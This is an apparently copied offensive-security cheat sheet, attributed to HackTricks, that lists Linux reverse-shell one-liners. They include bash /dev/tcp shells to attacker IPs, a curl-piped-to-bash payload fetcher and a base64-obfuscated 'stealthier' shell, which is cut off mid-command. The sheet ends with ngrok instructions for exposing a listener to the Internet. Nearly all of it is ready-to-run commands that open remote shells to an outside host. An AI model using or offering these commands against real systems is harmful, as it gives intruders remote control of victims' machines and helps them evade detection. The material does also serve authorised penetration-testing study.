From https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux 

Bash | sh

curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0

Symbol safe shell

#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | b




ngrok

ngrok is a tool to expose solutions to Internet in one command line.
Exposition URI are like: UID.ngrok.io
Installation

    Create an account: https://ngrok.com/signup

    Client download:

tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit

Basic usages

Documentation: https://ngrok.com/docs/getting-started/.

It is also possible to add authentication and TLS, if necessary.
Tunneling TCP

# Pointing to 0.0.0.0:4444 
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345

Exposing files with HTTP

./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/

Sniffing HTTP calls

Useful for XSS,SSRF,SSTI ...
Directly from stdout or in the HTTP interface http://127.0.0.1:4040.
Tunneling internal HTTP service

./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"


Tests done; 


